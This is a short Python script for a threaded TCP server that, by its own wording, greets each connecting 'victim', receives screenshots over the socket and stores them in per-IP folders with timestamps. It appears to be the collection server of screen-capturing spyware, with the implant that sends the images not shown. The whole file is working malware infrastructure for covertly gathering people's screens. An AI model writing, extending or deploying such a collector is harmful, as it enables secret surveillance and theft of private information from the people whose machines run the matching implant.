import socket
import os
import threading
from datetime import datetime


def start_server(host="127.0.0.1", port=22010):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"Server listening on {host}:{port}")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"A new victim was born -> {client_address[0]}:{client_address[1]}")
        threading.Thread(target=handle_client, args=(client_socket, client_address)).start()


def handle_client(client_socket, client_address):
    client_ip = client_address[0]
    save_directory = os.path.join(os.getcwd(), client_ip)
    os.makedirs(save_directory, exist_ok=True)

    try:
        while True:
            data = client_socket.recv(8)
            if not data:
                break

            image_size = int(data.decode())
            received_data = b''

            while len(received_data) < image_size:
                chunk = client_socket.recv(1024)
                if not chunk:
                    break
                received_data += chunk

            timestamp = datetime.now().strftime("%d_%m_%Y_%H_%M_%S")
            image_path = os.path.join(save_directory, f"{timestamp}.png")
            with open(image_path, 'wb') as image_file:
                image_file.write(received_data)

            print(f"Saved screenshot from {client_ip} as {image_path}")

    except Exception as e:
        print(f"Error handling client {client_ip}: {e}")
    finally:
        client_socket.close()
        print(f"Connection closed with {client_ip}")


start_server()
